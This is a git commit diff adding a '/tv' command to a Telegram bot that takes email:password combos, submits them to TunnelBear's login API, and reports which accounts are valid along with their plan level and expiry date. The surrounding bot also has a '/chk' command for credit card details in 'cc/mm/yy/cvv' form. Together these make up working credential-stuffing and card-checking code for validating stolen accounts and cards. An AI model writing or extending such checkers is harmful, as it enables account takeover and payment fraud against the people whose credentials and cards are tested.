2b9fe35bc8523121954c32f670449f506222d1e9
Nitin1818 <74262832+xbinner18@users.noreply.github.com>
2021-07-24 23:32:16 +0530

    Tunnelbear vpn ac check

--- bot.py
+++ bot.py
@@ -26,6 +26,54 @@ async def send_welcome(message: types.Message):
         "Hello how to use <code>/chk cc/mm/yy/cvv</code>"
     )
     
+
+@dp.message_handler(commands=['tv'], commands_prefix=PREFIX)
+async def tv(message: types.Message):
+    tic = time.perf_counter()
+    await message.answer_chat_action("typing")
+    ac = message.text[len('/tv '):]
+    splitter = ac.split(':')
+    email = splitter[0]
+    password = splitter[1]
+    if not ac:
+        return await message.reply(
+            "<code>Send ac /tv email|pass.</code>"
+        )
+    session = requests.session()
+    payload = {
+        "username": email,
+        "password": password,
+        "withUserDetails": "true",
+        "v": "web-1.0"
+    }
+    
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4571.0 Safari/537.36 Edg/93.0.957.0",
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/x-www-form-urlencoded"
+    }
+    
+    r = session.post("https://prod-api-core.tunnelbear.com/core/web/api/login",
+                     data=payload, headers=headers)
+    
+    # capture ac details
+    if "Access denied" in r.text:
+        await message.reply(f"""
+<b>COMBO</b>➟ <code>{ac}</code>
+<b>STATUS</b>➟ ❌WRONG DETAILS
+""")
+    elif "PASS" in r.text:
+        res = r.json()
+        await message.reply(f"""
+<b>COMBO</b>➟ <code>{ac}</code>
+<b>STATUS</b>➟ ✅VALID
+<b>LEVEL</b>➟ {res['details']['bearType']}
+<b>VALIDTILL</b>➟ {res['details']['fullVersionUntil']}
+<b>CHKBY</b>➟ <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a>
+""")
+    else:
+        await message.reply("Error❌: REQ failed")
+        
     
 @dp.message_handler(commands=['chk'], commands_prefix=PREFIX)
 async def ch(message: types.Message):
